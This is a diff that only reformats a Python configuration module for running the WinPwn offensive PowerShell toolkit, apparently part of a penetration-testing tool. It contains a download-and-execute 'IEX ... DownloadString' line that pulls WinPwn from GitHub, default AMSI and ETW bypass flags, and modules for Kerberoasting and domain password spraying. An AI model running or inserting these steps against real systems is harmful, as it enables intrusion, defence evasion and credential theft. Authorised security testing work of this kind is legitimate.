@@ -22,18 +22,20 @@ import os
 from dataclasses import dataclass, field
 from enum import Enum
 from pathlib import Path
-from typing import List, Optional, Dict, Any
+from typing import Any, Dict, List, Optional
 
 
 class WinPwnExecutionMode(Enum):
     """WinPwn execution mode."""
-    LOCAL_SCRIPT = "local"          # Run from local .ps1 file
-    REMOTE_REPO = "remote"          # Load from GitHub
-    CUSTOM_REPO = "custom"          # Load from custom repo server
+
+    LOCAL_SCRIPT = "local"  # Run from local .ps1 file
+    REMOTE_REPO = "remote"  # Load from GitHub
+    CUSTOM_REPO = "custom"  # Load from custom repo server
 
 
 class WinPwnModule(Enum):
     """WinPwn functional modules."""
+
     # Reconnaissance
     LOCAL_RECON = "localrecon"
     DOMAIN_RECON = "domainrecon"
@@ -69,6 +71,7 @@ class WinPwnModule(Enum):
 @dataclass
 class WinPwnCredentials:
     """Credentials for WinPwn operations."""
+
     username: str = ""
     password: str = ""
     domain: str = ""
@@ -87,10 +90,7 @@ class WinPwnCredentials:
 
     def has_credentials(self) -> bool:
         """Check if valid credentials exist."""
-        return bool(
-            (self.username and self.password) or
-            (self.username and self.ntlm_hash)
-        )
+        return bool((self.username and self.password) or (self.username and self.ntlm_hash))
 
 
 @dataclass
@@ -98,16 +98,16 @@ class WinPwnConfig:
     """WinPwn execution configuration."""
 
     # Script location
-    script_path: str = ""           # Path to local WinPwn.ps1
-    repo_url: str = ""              # Custom repo URL (if not GitHub)
+    script_path: str = ""  # Path to local WinPwn.ps1
+    repo_url: str = ""  # Custom repo URL (if not GitHub)
 
     # Execution mode
     execution_mode: WinPwnExecutionMode = WinPwnExecutionMode.LOCAL_SCRIPT
 
     # Target information
-    target_host: str = ""           # Target machine IP/hostname
-    dc_ip: str = ""                 # Domain Controller IP
-    domain: str = ""                # Domain name
+    target_host: str = ""  # Target machine IP/hostname
+    dc_ip: str = ""  # Domain Controller IP
+    domain: str = ""  # Domain name
 
     # Credentials
     credentials: WinPwnCredentials = field(default_factory=WinPwnCredentials)
@@ -116,10 +116,10 @@ class WinPwnConfig:
     enabled_modules: List[WinPwnModule] = field(default_factory=list)
 
     # Execution options
-    run_as_admin: bool = False      # Require admin privileges
-    bypass_amsi: bool = True        # Attempt AMSI bypass
-    bypass_etw: bool = True         # Attempt ETW bypass
-    noninteractive: bool = True     # Run non-interactively
+    run_as_admin: bool = False  # Require admin privileges
+    bypass_amsi: bool = True  # Attempt AMSI bypass
+    bypass_etw: bool = True  # Attempt ETW bypass
+    noninteractive: bool = True  # Run non-interactively
 
     # Output settings
     output_dir: str = "./winpwn_results"
@@ -127,12 +127,12 @@ class WinPwnConfig:
     verbose: bool = False
 
     # Timeout settings
-    timeout: int = 600              # 10 minute default timeout
-    module_timeout: int = 120       # Per-module timeout
+    timeout: int = 600  # 10 minute default timeout
+    module_timeout: int = 120  # Per-module timeout
 
     # PowerShell execution
     powershell_path: str = "powershell.exe"
-    pwsh_core: bool = False         # Use PowerShell Core
+    pwsh_core: bool = False  # Use PowerShell Core
     execution_policy: str = "Bypass"
 
     def __post_init__(self):
@@ -141,8 +141,7 @@ class WinPwnConfig:
             self.script_path = os.getenv("WINPWN_SCRIPT_PATH", "")
         if not self.repo_url:
             self.repo_url = os.getenv(
-                "WINPWN_REPO_URL",
-                "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master"
+                "WINPWN_REPO_URL", "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master"
             )
         if not self.domain:
             self.domain = os.getenv("AD_DOMAIN", "")
@@ -161,8 +160,8 @@ class WinPwnConfig:
 
         elif self.execution_mode == WinPwnExecutionMode.REMOTE_REPO:
             return (
-                f"IEX (New-Object Net.WebClient).DownloadString("
-                f"'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')"
+                "IEX (New-Object Net.WebClient).DownloadString("
+                "'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')"
             )
 
         elif self.execution_mode == WinPwnExecutionMode.CUSTOM_REPO:
@@ -223,7 +222,7 @@ def get_winpwn_config(
     dc_ip: Optional[str] = None,
     username: Optional[str] = None,
     password: Optional[str] = None,
-    **kwargs
+    **kwargs,
 ) -> WinPwnConfig:
     """
     Create WinPwnConfig from parameters and environment.
@@ -244,7 +243,7 @@ def get_winpwn_config(
         username=username or os.getenv("AD_USERNAME", ""),
         password=password or os.getenv("AD_PASSWORD", ""),
         domain=domain or os.getenv("AD_DOMAIN", ""),
-        ntlm_hash=kwargs.get("ntlm_hash", os.getenv("AD_NTLM_HASH", ""))
+        ntlm_hash=kwargs.get("ntlm_hash", os.getenv("AD_NTLM_HASH", "")),
     )
 
     # Determine execution mode
@@ -270,7 +269,7 @@ def get_winpwn_config(
         noninteractive=kwargs.get("noninteractive", True),
         output_dir=kwargs.get("output_dir", "./winpwn_results"),
         timeout=kwargs.get("timeout", 600),
-        verbose=kwargs.get("verbose", False)
+        verbose=kwargs.get("verbose", False),
     )
 
 
@@ -284,11 +283,7 @@ def validate_winpwn_config(config: WinPwnConfig) -> Dict[str, Any]:
     Returns:
         Dict with validation results
     """
-    results = {
-        "valid": False,
-        "errors": [],
-        "warnings": []
-    }
+    results = {"valid": False, "errors": [], "warnings": []}
 
     # Check script availability for local mode
     if config.execution_mode == WinPwnExecutionMode.LOCAL_SCRIPT:
@@ -298,20 +293,19 @@ def validate_winpwn_config(config: WinPwnConfig) -> Dict[str, Any]:
             results["errors"].append(f"Script not found: {config.script_path}")
 
     # Check credentials for domain operations
-    if any(m in config.enabled_modules for m in [
-        WinPwnModule.DOMAIN_RECON,
-        WinPwnModule.KERBEROASTING,
-        WinPwnModule.BLOODHOUND,
-        WinPwnModule.DOMAIN_SPRAY
-    ]):
+    if any(
+        m in config.enabled_modules
+        for m in [
+            WinPwnModule.DOMAIN_RECON,
+            WinPwnModule.KERBEROASTING,
+            WinPwnModule.BLOODHOUND,
+            WinPwnModule.DOMAIN_SPRAY,
+        ]
+    ):
         if not config.credentials.has_credentials():
-            results["warnings"].append(
-                "Domain modules enabled but no credentials provided"
-            )
+            results["warnings"].append("Domain modules enabled but no credentials provided")
         if not config.domain:
-            results["warnings"].append(
-                "Domain modules enabled but domain not specified"
-            )
+            results["warnings"].append("Domain modules enabled but domain not specified")
 
     # Check admin requirements
     for module in config.enabled_modules:
